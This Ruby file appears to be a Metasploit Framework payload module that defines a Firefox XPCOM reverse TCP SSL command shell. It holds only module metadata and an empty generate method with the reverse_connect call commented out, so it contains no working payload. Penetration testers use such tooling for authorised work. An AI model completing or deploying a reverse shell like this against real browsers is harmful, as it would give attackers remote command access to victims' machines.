##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/handler/reverse_tcp_ssl'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module Metasploit3

  include Msf::Payload::Single
  include Msf::Payload::Firefox
  include Msf::Sessions::CommandShellOptions

  def initialize(info={})
    super(merge_info(info,
      'Name'          => 'Command Shell, Reverse TCP SSL (via Firefox XPCOM script)',
      'Description'   => %q{Creates an interactive shell via Javascript with access to Firefox's XPCOM API},
      'Author'        => ['joev'],
      'License'       => BSD_LICENSE,
      'Platform'      => 'firefox',
      'Arch'          => ARCH_FIREFOX,
      'Handler'       => Msf::Handler::ReverseTcpSsl,
      'Session'       => Msf::Sessions::CommandShell,
      'PayloadType'   => 'firefox'
    ))
  end

  def generate
    # reverse_connect(:ssl => true)
    ""
  end

end
